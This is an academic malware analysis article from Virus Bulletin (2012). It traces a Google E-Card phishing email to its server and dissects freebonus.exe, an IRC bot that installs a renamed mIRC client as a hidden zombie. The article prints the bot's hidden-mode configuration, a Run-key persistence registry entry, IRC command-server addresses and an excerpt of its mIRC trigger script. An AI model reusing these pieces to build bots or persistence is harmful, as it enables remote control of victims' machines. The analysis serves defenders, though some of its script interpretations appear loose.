@@ -1,0 +1,274 @@
+Zombifying targets using phishing campaigns
+2012-04-01
+
+Aditya K. Sood
+Michigan State University
+,
+USA
+
+Richard J. Enbody
+Michigan State University
+,
+USA
+Editor:
+Helen
+
+Martin
+Abstract
+Aditya Sood and Richard Enbody analyse the details of the Google E-Card phishing campaign and its accompanying malicious binary to understand the propagation and distribution of the malware.
+Copyright © 2012 Virus Bulletin
+
+Phishing has grown exponentially over recent years. In this article we analyse the Google E-Card phishing campaign and its accompanying binary to show how a victim’s machine is compromised.
+Figure 1. Google E-Card phishing email.
+Figure 1 shows the Google E-Card phishing email. We gathered the following information from the email:
+A classic spoofing technique was used to make it appear as if the email had been sent from the address [email protected]
+The email headers pointed to a Chinese server running a webmail interface on port 80. Further investigation indicated that the server was controlled by the dgds.gov.cn authority. When the DNS was mapped and the Whois records were searched, it was found that the server was hosted somewhere in the ‘China Unicom Guangdong province network’.
+When we followed the link contained in the email, we noticed that the server was configured to host the freebonus.exe software package. The IP address (58.254.202.103) failed to resolve to any hostname or DNS name, and although it was included on a Malware Patrol blacklist [1], our browsers did not raise any warnings on visiting the site. We also scanned the domain using Wepawet [2], which returned benign results with no trace of malicious JavaScript or exploit.
+On reverse tracing the network using a decoy scan against the phishing server, several ports were found to be in an open state, including: FTP (21), SSH (22), SMTP (25), POP3 (110), IMAP (143) and HTTP (80). On querying port 25, the ‘220 mail.dgds.gov.cn ESMTP Postfix’ banner was received, which showed that the mail server was configured for the Chinese government network. The server was not configured as an open relay mailing server, as is usually the case for phishing servers. The IMAP interface was configured to support webmail running on port 80.
+It was found that the SMTP server was configured in a secure manner, with the following commands:
+220 mail.dgds.gov.cn ESMTP Postfix
+EHLO mail.dgds.gov.cn
+250-mail.dgds.gov.cn
+250-PIPELINING
+250-SIZE 52428800
+250-VRFY
+250-ETRN
+250-AUTH PLAIN LOGIN
+250-AUTH=PLAIN LOGIN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+Even though the VRFY command was enabled, it was not possible to verify the user accounts – the server replied with error message 252 (which states that the server is unable to verify the members of the mailing list). This suggests that either the server is fully compromised or an attack is in progress.
+FTP was running with anonymous access and it was possible to download some files from the server. A custom FTP banner was served when FTP was queried instead of the standard FTP server banner. On fuzzing, the FTP returned a ‘500 OPS - vsf_sysutil_recv_peek:’ error. This error is produced by the VSTFPD server when a capability module is missing from the kernel. However, the server was sufficiently secured not to support the PORT command for launching FTP bounce scans against machines in the same network.
+
+Dissecting FreeBonus.exe
+The Chinese server we had traced was serving a zipped self-extracting (SFX) package named freebonus.exe. Some generic techniques were applied to extract the SFX package, but only text files were extracted – which did not seem to make sense from a malware perspective. On closer analysis, we found a number of files that were configured in an obscure manner. As soon as these files were extracted, other critical files were hidden by default. Since the analysis was carried out in a controlled environment we proceeded to consider every step taken by the malware. Once the files were extracted, a generic ‘attrib -h *.*’ command was run to reveal the files present in the directory. The error received upon running that command was as follows:
+C:\Documents and Settings\Administrator\Desktop\freebonus>attrib -h *.*
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\aliases.ini
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\away.txt
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\baby.mrc
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\control.ini
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\feel.reg
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\firefox.exe
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\fullname.txt
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\gain.bat
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\ident.txt
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\jumbo.ico
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\lord.mrc
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\mirc.ini
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\remote.ini
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\servers.ini
+
+Not resetting system file - C:\Documents and Settings\Administrator\Desktop\free
+bonus\users.ini
+The error suggests that the system is not able to reset the files. This error occurs when files are marked with both hidden (h) and system (s) attributes in the directory. The files can only be retrieved when both flags are removed simultaneously. In order to do this, the ‘attrib -h -s *.*’ command was run, resulting in the successful extraction of files from the SFX package as shown in Figure 2.
+Figure 2. Extracted files from the Freebonus.exe package.
+The package was structured in an interesting manner. It was aimed at infecting systems running IRC client software and installed the same set of files as those that are present in a legitimate installation of IRC client software. However, this class of malware has the ability to change the user’s machine into a zombie that remains dormant and is only activated when a remote server sends a command. The functionality of the various files are discussed next.
+The main file in the package was ‘firefox.exe’. On performing a binary analysis of the file, we found that the executable was written in Borland C, and that the code had the well-defined structure of a message client. This binary looked legitimate in the way it was designed and written. The PE header of ‘firefox.exe’ gave the impression of being a mIRC client. We wondered whether the malware package was installing the legitimate mIRC client version 6.0.3. In order to verify our hypothesis, we conducted a binary differential analysis. mIRC client version 6.03 was downloaded from the Internet and LordPE was used to perform a binary comparison, as presented in Figure 3. We were surprised to find that ‘firefox.exe’ and ‘mirc.exe’ were the same in every aspect. This means that the malware package was actually installing a legitimate mIRC client on the victim machine as a service.
+Figure 3. Binary comparison between firefox.exe and mirc.exe.
+Signature-based tools would have raised a false positive on scanning the system. In reality, it is hard to say that an apparently legitimate binary file on the system would turn it into a zombie. The SFX package also contained a number of mIRC scripts. On analysing the mirc.ini file, we found that the IRC client settings had an option defined as hide=1, which directed the IRC client to execute in a hidden manner. The configuration file is shown below:
+[warn]
+fserve=on
+dcc=on
+[dirs]
+logdir=logs\
+
+[about]
+version=6.03
+show=BR26354
+
+[ports]
+random=off
+bind=off
+
+[ident]
+active=yes
+userid=Y
+system=UNIX
+port=113
+
+[socks]
+enabled=no
+port=1080
+method=4
+dccs=no
+useip=yes
+
+[clicks]
+status=/lusers
+query=/whois $$1 $$1
+channel=/channel
+nicklist=/query $$1
+notify=/whois $$1 $$1
+message=/whois $$1 $$1
+
+[dde]
+ServerStatus=off
+ServiceName=firefox
+CheckName=off
+
+[text]
+network=All
+commandchar=/
+linesep=-
+timestamp=[HH:nn]
+accept=*.jpg,*.gif,*.png,*.bmp,*.txt,*.log,*.wav,*.mid,*.mp3,*.wma,*.ogg,*.zip
+ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs,*.htm,*.html
+aptitle=Mozilla Firefox
+quit=losing my brains
+theme=mIRC Classic
+
+[fileserver]
+warning=on
+[dccserver]
+n0=0,59,0,0,0,0
+[
+[mirc]
+user=V
+nick=V
+anick=V
+email=V
+host=BudapestSERVER:Budapest.Hu.Eu.Undernet.Org:7000GROUP:Undernet
+[
+files]
+servers=servers.ini
+finger=finger.txt
+urls=urls.ini
+addrbk=addrbk.ini
+trayicon=jumbo.ico
+
+[styles]
+thin=0
+font=0
+hide=1
+color=default
+size=2
+buttons=0
+
+[nicklist]
+[windows]
+main=1244,123,0,34,3,1,0
+scripts=-2,1279,-5,931,0,0,0
+wchannel=0,610,0,128,0,1,0
+wquery=84,610,84,195,2,1,0
+wdccs=-1,269,-1,264,0,1,0
+wnotify=-1,602,-1,268,0,1,0
+playctrl=352,308,178,289,0,0,0
+
+[pfiles]
+n0=popups.ini
+[notify]
+
+[afiles]
+n0=aliases.ini
+
+[rfiles]
+n0=users.ini
+n1=remote.ini
+n2=baby.mrc
+n3=lord.mrc
+The package also contained files such as ‘ident.txt’, ‘servers.ini’, ‘lord.mrc’ and ‘baby.mrc’. When the SFX package was unpacked, ‘gain.bat’ started executing its commands. First, it manipulated the registry entries. Next, it installed the binary into the history folder present in the temporary directory in the ‘%systemroot’ folder. Then it hid the history folder by running the attrib command. Generally, the batch file acted as an installer for the malicious IRC client. The baby.mrc and lord.mrc scripts were executed automatically after the installation of firefox.exe as a service. The malicious firefox.exe client triggered these scripts for joining the remote channel and acting as a zombie for the attacker to control the machine. The mIRC scripts were used to communicate with the admin of the channel by building an ident profile for every server listed in the ‘servers.ini’ file.
+The ‘servers.ini’ file was used by the malicious IRC client (firefox.exe) for initiating connections to the various IRC servers listed in the file. In order to connect to those servers, the IRC client used the ‘users.ini’ file to pick up user details. The file contained close to 15 entries related to different IRC servers. The server entries were structured as ‘n1=ManaGerSERVER:ff.freebsd.md:8889GROUP:ManaGer’, ‘n18=BucharestSERVER:82.76.255.62:6662:Undernet’, etc. This suggested that IRC servers were differentiated based on the groups. A ‘Manager’ group was designated for the channel administrators who controlled the bot, while ‘Undernet’ was the group used for other agents in the network. The IRC servers were found to be in different geographical areas around the globe, which showed that the malware infections were managed in a decentralized manner.
+On inspecting ‘feel.reg’, we found that registry entries were modified for installing ‘firefox.exe’ as a hidden service. One registry entry, ‘[HKEY_CURRENT_USER\Software\mIRC\UserName]@=“PeNdEjO!”’, defined the username of the installed mIRC client as ‘PeNdEjO!’. Another entry in the registry was labelled: ‘[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] “firefox”=“\”C:\\Windows\\temp\\history\\firefox.exe\’. This caused the process to run in an automated manner when the system was rebooted.
+
+Inside MIRC scripts
+The IRC scripts included in the SFX package perform malicious activity on the victim’s machine. The following is a snippet of the lord.mrc script:
+on *:open:?:{
+inc -u3 %msg.chalange 1
+if (%msg.chalange == 2) {
+ame 10Message4 Flood6 detectat2,6 activez4 silence6 pentru4 16 minut2.
+silence +*!*@*
+timerunsilence 1 60 silence -*!*@*
+close -m
+}
+}
+on *:notice:*:?:{
+if (%notice.chalange.nick != $nick) {
+inc -u3 %notice.chalange 1
+}
+if (%notice.chalange == 2) {
+ame 10Notice4 Flood6 detectat2,6 activez4 silence6 pentru4 16 minut2.
+silence +*!*@*
+timerunsilence 1 60 silence -*!*@*
+}
+set %notice.chalange.nick $nick
+}
+ctcp *:*:?:{
+if (%ctcp.chalange.nick != $nick) {
+inc -u3 %ctcp.chalange 1
+}
+if (%ctcp.chalange == 2) {
+ame 10CTCP4 Flood6 detectat2,6 activez4 silence6 pentru4 16 minut2.
+silence +*!*@*
+timerunsilence 1 60 silence -*!*@*
+}
+set %ctcp.chalange.nick $nick
+}
+on *:invite:#:{
+if (%invite.chalange.nick != $nick) {
+inc -u3 %invite.chalange 1
+}
+if (%invite.chalange == 2) {
+ame 10Invite4 Flood6 detectat2,6 activez4 silence6 pentru4 16 minut2.
+silence +*!*@*
+timerunsilence 1 60 silence -*!*@*
+}
+set %invite.chalange.nick $nick
+}
+on 1:connect:{
+nick $read ident.txt $+ $r(a,z)
+anick $read ident.txt $+ $r(a,z)
+fullname $read fullname.txt
+identd on $read ident.txt
+.timer 1 5 mode $me +iwx
+.timer 1 7 silence +*!*@*,~*!*@*undernet.org
+.timer 1 17 secure
+.notify on
+}
+on *:notice:*:#:{ hinc -mu2 spam $chan | if $hget(spam,$chan) >= 3 { mode $me +d | timerunsilence 1 60 mode $me -d | ame  6Am activat modul 4 +d 6pentru 4 1 6minut din cauza floodului2.
+---- Truncated ----
+The script defines the events as invite, open, notice, ctcp etc. Most of the malicious IRC scripts are written as triggers or events that execute when a particular action is taken. Triggers are defined to automate activity from the IRC client. The generic pattern of a trigger statement is ‘on <level>:<event>: { ;Statement block }’. The level is defined as the access level on the IRC channel. The following are explanations of some of the triggers from the malicious IRC scripts:
+The ‘open’ event is created for all access levels on the IRC channel. The ‘inc -u3 %msg.chalange 1’ command handles the value in variable %msg.chalange. In this case if the value of %msg.chalange is incremented by one, then after three seconds %msg.chalange will be null. After this, if the required condition is matched then the ‘ame’ command is executed. The ‘ame’ command sends a specific action to all channels that the bot is currently on. In this script, the ‘ame’ command sends a ‘10Message4 Flood6 detectat2, 6 activez4 silence6 pentru4 16 minute2’ message, which defines the flooding activity to be started by the bot connected on a particular channel when final notification is sent by the server manager. The command ‘silence +*!*@*’ hibernates the bot on the channel, and ‘timerunsilence’ defines the time period for activating the bot on the channel.
+Other triggers include the ‘invite’ and ‘notify’ events. The file also contains a ‘CTCP’ (client-to-client protocol) trigger. The CTCP command is used to perform client-specific functions on the IRC network. CTCP is used widely for operations such as setting a file server on the victim machine or enabling bots to perform operations without user interaction with the lRC client. The CTCP trigger notifies the channel that a victim’s machine ($nickname) is open and already established on the communication channel. The generic CTCP command is used as ‘/ctcp <nickname><ping|finger|version|time|userinfo|clientinfo>’. The ‘invite’ trigger is used to invite other users to the same channel. The user list is provided in the users.ini and ident.txt files.
+The ‘connect’ event is triggered for initiating connections using the ident profile, the IRC client startss and identd server on port 113 on the victim’s machine. The ‘nick’ command reads an entry from ident.txt and starts connecting back to the IRC server silently.
+The final trigger is the ‘notice’ event that is used to send a specified notice to the user (nick) on the channel. In this script, messages related to spam are sent in a timely manner.
+The malicious scripts are sending notifications for starting flooding and spamming activities on the channel.
+
+Discussion
+This malware uses IRC scripting to perform malicious activity on victims’ machines. Our analysis and evaluation has indicated that IRC scripting is not a very clear programming language. The IRC clients and IRC scripts are designed to activate backdoors on the victim machine by downloading other malicious programs from remote servers. In this sample, the group leader can use the IRC scripts to control the IRC client and force it to connect to predefined IRC servers and join specific channels. While carrying out background research, we found that a similar variant of this malware [3] has previously been analysed.
+
+Conclusion
+We have analysed the details of a phishing zombie to understand the propagation and distribution of the malware. We found that tracking the malware domain back to its source can provide a wealth of information to better understand the mechanisms. The malicious binary was also dissected to understand the design of this malware that infects machines and turns them into zombies. One aim of this study is to present a glimpse into the methodology used to track back malicious servers for gathering details about the malicious tools.
+
+Bibliography
+[1] http://www.malware.com.br/cgi/submit-agressive?action=list&type=agressive.
+[2] Wepawet. http://wepawet.iseclab.org/index.php.
+[3] Client-IRC.Win32.mIRC.603, Backdoor.IRC.Zapchast.zwrc, http://www.threatexpert.com/report.aspx?md5=c0d2abe80f901502fb3e7a40f8bf77aa.
